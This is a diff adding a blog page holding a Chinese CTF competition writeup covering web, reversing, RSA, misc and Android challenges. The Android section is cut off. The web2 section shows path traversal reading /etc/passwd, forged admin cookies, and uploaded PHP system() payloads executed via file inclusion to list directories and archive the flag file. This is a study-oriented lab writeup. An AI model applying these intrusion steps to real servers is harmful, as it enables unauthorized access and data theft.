@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="平凡">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="平凡">
+    
+    <meta name="keywords" content="kongpingfan,kongpingfan-blog,pingfan">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>第四届全国网络空间安全技术大赛 writeup · Kongpingfan&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script> -->
+
+
+    <!-- <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atelier-heath-light.min.css"> -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/vs2015.min.css">
+
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <!-- 百度统计  -->
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?b4bccf94e7fc5c0889f3eb16e5147882";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Pingfan&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">第四届全国网络空间安全技术大赛 writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Pingfan's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            第四届全国网络空间安全技术大赛 writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/05/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>进去后url如下：</p>
+<pre><code>http://117.34.116.192/index.php?file=login.html
+</code></pre><p>这道题一看url格式，便考虑到PHP文件包含。但是使用php://filter和php://input进行测试的时候，发现“：”被过滤了。<br>于是一套乱摸，倒是摸到了两个敏感文件：</p>
+<pre><code>http://117.34.116.192/index.php?file=../../../../etc/apache2/apache2.conf
+http://117.34.116.192/index.php?file=../../../../etc/passwd
+</code></pre><p>都能读出来，但没什么用，想找aceess.log也没找到。<br>后来发现存在git源码泄漏：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1386888-9405e9311d7b13e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>于是使用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a>这个工具，下载到了网站源码：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-9995e90a8a12df65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>查看了一下index.php，发现是php-screw加密的，到网上查了下，使用下面这款工具可以解密：<br><a href="https://github.com/firebroo/screw_decode" target="_blank" rel="noopener">https://github.com/firebroo/screw_decode</a><br>解出来index.php源码如下：</p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    if(!isset($_GET[&#39;file&#39;])||empty($_GET[&#39;file&#39;])){
+         header(&#39;Refresh:1,url=index.php?file=login.html&#39;);
+         die;
+    }
+    $file  = $_GET[&#39;file&#39;];
+
+    if ((strpos($file,&#39;:&#39;)!==false)){
+        header(&#39;Refresh:1,url=index.php?file=login.html&#39;);
+        echo &quot;illgal filename!!&quot;;
+        die;
+    }
+    include_once($file);
+?&gt;
+</code></pre><p>果然过滤了“：”。无奈审计了一下upload.php:</p>
+<pre><code> &lt;?php
+    function Administrator($value){
+        if(empty($_COOKIE[&#39;in_adminid&#39;]) || empty($_COOKIE[&#39;in_adminexpire&#39;]) || $_COOKIE[&#39;in_adminexpire&#39;]!==md5($_COOKIE[&#39;in_adminid&#39;].$_COOKIE[&#39;in_adminname&#39;].$_COOKIE[&#39;in_adminpassword&#39;].$_COOKIE[&#39;in_permission&#39;])){
+            return False;
+        }
+        setcookie(&quot;in_adminexpire&quot;,$_COOKIE[&#39;in_adminexpire&#39;],time()+1800);
+        if(!empty($_COOKIE[&#39;in_permission&#39;])){
+            $array=explode(&quot;,&quot;,$_COOKIE[&#39;in_permission&#39;]);
+            $adminlogined=false;
+            for($i=0;$i&lt;count($array);$i++){
+                if($array[$i]==$value){$adminlogined=true;}
+            }
+            if(!$adminlogined){
+                return False;
+            }
+        }else{
+            return False;
+        }
+        return true;
+    }
+    if (Administrator(2)){
+        if(isset($_FILES[&#39;file&#39;])){
+            $filename = &#39;./img/img&#39;.rand().&#39;.jpg&#39;;
+            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$filename);
+            header(&#39;Refresh:3,url=index.php?file=upload.php&#39;);
+            echo &quot;Upload $filename Success!&quot;;
+            die;
+        }
+    }else{
+        header(&#39;Refresh:3,url=index.php?file=login.html&#39;);
+        echo &quot;Who are you!&quot;;
+        die;
+    }
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;
+    &lt;link rel=&quot;icon&quot; href=&quot;../../favicon.ico&quot;&gt;
+    &lt;title&gt;图床后台&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&quot;starter-template.css&quot; rel=&quot;stylesheet&quot;&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;script src=&quot;https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;     
+    &lt;form class=&quot;form-horizontal&quot; action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;fieldset&gt;
+      &lt;div id=&quot;legend&quot; class=&quot;&quot;&gt;
+        &lt;legend class=&quot;&quot;&gt;添加图片&lt;/legend&gt;
+      &lt;/div&gt;
+    &lt;div class=&quot;control-group&quot;&gt;
+          &lt;!-- Text input--&gt;
+          &lt;label class=&quot;control-label&quot; for=&quot;input01&quot;&gt;图片名&lt;/label&gt;
+          &lt;div class=&quot;controls&quot;&gt;
+            &lt;input placeholder=&quot;请输入Message标题&quot; class=&quot;input-xlarge&quot; type=&quot;text&quot; name=&quot;title&quot;&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+
+    &lt;div class=&quot;control-group&quot;&gt;
+          &lt;label class=&quot;control-label&quot;&gt;附件&lt;/label&gt;
+          &lt;!-- File Upload --&gt;
+          &lt;div class=&quot;controls&quot;&gt;
+            &lt;input class=&quot;input-file&quot; id=&quot;file&quot; type=&quot;file&quot; name=&#39;file&#39;&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+
+
+
+    &lt;div class=&quot;control-group&quot;&gt;
+          &lt;label class=&quot;control-label&quot;&gt;预览&lt;/label&gt;
+          &lt;!-- Button --&gt;
+          &lt;div class=&quot;controls&quot;&gt;
+            &lt;button class=&quot;btn btn-success&quot;&gt;Submit&lt;/button&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+
+    &lt;/fieldset&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre><p>可以伪造cookie进行访问，并且cookie的条件一定要满足几个条件</p>
+<ol>
+<li>in_permission=2</li>
+<li>in_adminid、in_adminname、in_adminpassword、in_adminexpire都要设置</li>
+<li>in_adminexpire的值为前面几个组成字符串的md5。<br>所以，构造cookie如下：<pre><code>in_adminid=1
+in_adminname=admin
+in_adminpassword=admin
+in_permission=2
+in_adminexpire=5d7a9e2c9e55c06ac7d03e52dcacbb25
+</code></pre>伪造cookie后可以成功访问upload.php：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-bc988073883b5d85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>随便找张图片上传，结果正如上述源码中一样，会被重命名为随机数字+.jpg，并且图片地址会显示到前端：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-312f21e3da963604.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这样一来上传网马后，不能直接访问url运行木马了，但是综合前面的文件包含，可以做到让木马执行。<br>本来想上传个大马，结果成功加载了，奈何输入密码后页面乱了。。。<br><img src="https://upload-images.jianshu.io/upload_images/1386888-125eb835b1e2d132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="成功出现大马页面"></li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/1386888-28144494acc5dd81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="尴尬的页面"></p>
+<p>大马不能执行，就了下换思路，手写php代码，读网站根目录 -&gt; 找到flag文件 -&gt; 读出flag。<br>首先是读网站根目录：</p>
+<pre><code>&lt;?php echo system(&#39;ls /var/www&#39;) ?&gt;
+</code></pre><p>把这个文件上传后，使用文件包含，成功读出下级目录：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-9a9c8ad494842038.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>接下来读/var/www/html目录下的文件：</p>
+<pre><code>&lt;?php echo system(&#39;ls /var/www/html&#39;) ?&gt;
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/1386888-70039f4eb90e61ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>flag文件明显是f14g.php，本来以为访问就稳了，没想到是个空页面。看来只能把它读出来了。<br>使用下面命令：</p>
+<pre><code>&lt;?php echo system(&#39;cat /var/www/html/f13g.php&#39;) ?&gt;
+</code></pre><p>读出来是这么一串：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-b7271d3756ede4ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>使用php screw解密工具，发现解不出来，真的很烦人，眼看到最后一步了flag就是不出来。。<br>后来经过比对，发现应该是网页编码的原因，能正常解密的如下图上半部分所示，下半部分的明显跟它长的不一样。所以还得换种思路<br><img src="https://upload-images.jianshu.io/upload_images/1386888-9a48f7b611054a09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>后来想到了一个骚操作，既然访问乱码，那干脆把你压缩后下载下来不就完事了？<br>骚代码如下:</p>
+<pre><code>&lt;?php
+system(&#39;tar zvcfP /var/www/html/img/img123.tar /var/www/html/f14g.php&#39;);
+</code></pre><p>注意，考虑到网站根目录可能不存在写权限，把它写到img文件夹下面是比较稳的选择。<br>执行完后，下载img123.tar，成功得到flag文件，这次使用php screw解密工具，终于拿到了flag……<br><img src="https://upload-images.jianshu.io/upload_images/1386888-3d498e58374627d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>web狗的生存越来越艰难了。。</p>
+<blockquote>
+<p>后记：<br>看别人的writeup，是写了个一句木马连上的。。当时大马连接失败后为什么没用这个，唉。可以省不少时间</p>
+</blockquote>
+<h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>题目给了一个pyc文件，可以用uncompyle2转成py文件</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1386888-653a5c7a532a434e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>发现主要是把输入作为encodestr()函数的参数，然后将返回值与一个数组比较。<br>看encodestr函数，发现keyc为输入求md5取后4位，string的末尾是输入字符串，只有这两个变量直接受输入影响，其他一些变量都是已知或受keyc影响，而string只在最后异或来求result。也就是说可以爆破keyc，通过result反求出string，如果string的末尾（输入内容）求md5的后4位与keyc相等，就说明得到了正确的string。爆破脚本如下：</p>
+<pre><code>#! /usr/bin/env python 2.7 (62211)
+#coding=utf-8
+
+from hashlib import md5
+import base64
+from time import time
+from datetime import datetime
+import sys
+
+def encodestr(keyc):
+    UC_KEY = &#39;123456789&#39;
+    key = md5(UC_KEY.encode(&#39;utf-8&#39;)).hexdigest()
+    keya = md5(key[0:16].encode(&#39;utf-8&#39;)).hexdigest()
+    keyb = md5(key[16:32].encode(&#39;utf-8&#39;)).hexdigest()
+    ckey_length = 4
+    #keyc = md5(string.encode(&#39;utf-8&#39;)).hexdigest()[-ckey_length:] #输入md5后4位
+    cryptkey = md5((keya + keyc).encode(&#39;utf-8&#39;)).hexdigest() #后4位与确定数的md5
+    key_length = len(cryptkey)
+    expiry = 20
+    #string = &#39;%10d&#39; % expiry + md5((string + keyb).encode(&#39;utf-8&#39;)).hexdigest()[0:16] + string
+    box = range(256)
+    rndkey = [0] * 256
+    for i in range(256):
+        rndkey[i] = ord(cryptkey[i % key_length])
+
+    string_length = 49
+    d = [128, 220, 109, 113, 242, 153, 181, 203, 21, 122, 2, 101, 42, 55, 56, 19, 190, 181, 99, 47, 217, 109, 129, 221, 9, 65, 235, 48, 197, 103, 123, 86, 25, 112, 172, 175, 42, 168, 232, 81, 224, 170, 16, 210, 98, 229, 15, 30, 134]
+
+    j = 0
+    for i in range(256):
+        j = (j + box[i] + rndkey[i]) % 256
+        tmp = box[i]
+        box[i] = box[j]
+        box[j] = tmp
+
+    a = 0
+    j = 0
+    string=&#39;&#39;
+    for i in range(string_length):
+        a = (a + 1) % 256
+        j = (j + box[a]) % 256
+        tmp = box[a]
+        box[a] = box[j]
+        box[j] = tmp
+        string+=chr(d[i]^box[(box[a] + box[j])%256])
+    try:
+
+        a=md5(string[26:].encode(&#39;utf-8&#39;)).hexdigest()[-ckey_length:]
+        #print a
+        if a==keyc:
+            print string[26:]
+            return 1
+    except:
+        pass
+    return 0
+
+
+mdstr=&#39;1234567890abcdef&#39;
+for c1 in mdstr:
+    s1=c1
+    for c2 in mdstr:
+        s2=s1+c2
+        for c3 in mdstr:
+            s3=s2+c3
+            for c4 in mdstr:
+                s4=s3+c4
+                encodestr(s4)
+
+</code></pre><hr>
+<h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>第一个验证函数如下：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-1efa6db1c91049dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>因为是每个字符ascii值模37，其实范围已经很小了，直接把每个字符可能的结果打印一下就基本就能判断出来了，脚本如下：</p>
+<pre><code>array=[0,0x23,0x19,0x16,0x22,0x08,0x17,0x18,0x12,0x17,0x1C,0x01,0x21]
+flag=[]
+for i in range(12):
+    s=&#39;&#39;
+    for c in range(0x20,0x7f):
+        if (c + array[i])%37==array[i+1]:s+=chr(c)
+    flag.append(s)
+print flag
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/1386888-50a2bf2d892c52a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="可以推出来就是Hell0-Kitty"><a href="#可以推出来就是Hell0-Kitty" class="headerlink" title="可以推出来就是Hell0~Kitty"></a>可以推出来就是Hell0~Kitty</h2><p>###rsa1<br>正常RSA的原理是：<br>e<em>d=1 %  phi_n<br>加密：c=m^e%n<br>解密：m=c^d=m^(e</em>d)=m%n</p>
+<p>这道题里，利用Crypto库的inverse函数求e模phi_n的逆d（当然结果并不是真正的逆，因为两者不互素），计算e*d % phi_n，结果为8，这样解密过程就成了：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-c9b4dfddf4cd4816.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>故求出的结果是明文的8次方<br>脚本如下：</p>
+<pre><code>from Crypto.Util.number import bytes_to_long, getStrongPrime, GCD, inverse, isPrime
+p=111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613
+q=146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573
+e=200
+c=7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405
+fin=(q-1)*(p-1)
+
+d = inverse(e, fin)
+
+print (e*d)%(fin) #e*d=8 %(fin)
+s=pow(c,d,q*p)
+print s
+
+</code></pre><p>结果为：</p>
+<p>8790672647699888791168395876725267498380050204509042605325148440775761512060209862878377062250498277565324799241101114626203022698873680727368886696009248411945050428305804829613871379890954039096785744465245794789247131505229329627996841022729341182437065625045609809888462300362847200777304046131988810944506109283470335905223526693623008137885581446429211468764465976794495528511148211351567422881</p>
+<p>在大数分解网站<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a> 上分解可以得出开8次方的结果，转hex每2位转字符就得到flag了。</p>
+<hr>
+<h1 id="misc2-wp"><a href="#misc2-wp" class="headerlink" title="misc2 wp"></a>misc2 wp</h1><p>题目提示这题可以在windows下解。</p>
+<p>显而易见有ntfs流藏匿文件。</p>
+<p>下载压缩包后，7-zip打开可以看到ntfs流隐藏的文件。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1386888-da18d29ce314ef2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>用word打开看了一遍，就只是个我有个梦想的英文版。</p>
+<p>抖了个机灵用notepad打开，搜索<code>f l a g</code>（注意有空格），搜到了前半截flag。</p>
+<p>这时候就陷入了江江江局。后面又抖了个机灵搜索 <code>}</code>， 于是拿到了后半截flag。<br><img src="https://upload-images.jianshu.io/upload_images/1386888-d5276abd69b8b779.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1386888-d57f67b08b2488f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1386888-6d6eef070a112130.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id><a href="#" class="headerlink" title></a><img src="https://upload-images.jianshu.io/upload_images/1386888-69fa1dd0c9310d37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></h2><h1 id="安卓-基础加密"><a href="#安卓-基础加密" class="headerlink" title="安卓 基础加密"></a>安卓 基础加密</h1><p>进入看到MainActivity，关键代码如下，逻辑很清楚，就是输入的数字经过reinforce函数处理后作为submitFlag函数参数传入可以使返回值为1.<br><img src="https://upload-images.jianshu.io/upload_images/1386888-45dc4b23cdd9bc13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>两个函数都是原生函数。<br><img src="https://upload-images.jianshu.io/upload_images/1386888-9d1723171fa205ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<ol>
